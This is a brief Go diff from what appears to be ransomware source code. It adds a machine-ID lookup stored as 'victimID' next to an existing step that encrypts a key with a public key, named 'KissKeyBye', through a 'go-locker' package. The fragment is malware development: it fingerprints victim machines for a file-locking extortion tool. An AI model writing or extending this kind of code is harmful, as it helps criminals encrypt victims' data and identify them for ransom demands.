@@ -7,6 +7,8 @@ import (
 	"path/filepath"
 	"runtime"
 
+	mid "github.com/denisbrodbeck/machineid"
+
 	"github.com/go-locker/locker"
 )
 
@@ -53,5 +55,9 @@ func main() {
 	}
 
 	KissKeyBye := locker.KeyEncrypt(pubKey)
+	victimID, err := mid.ID()
+	if err != nil {
+		fmt.Println(err)
+	}
 
 }
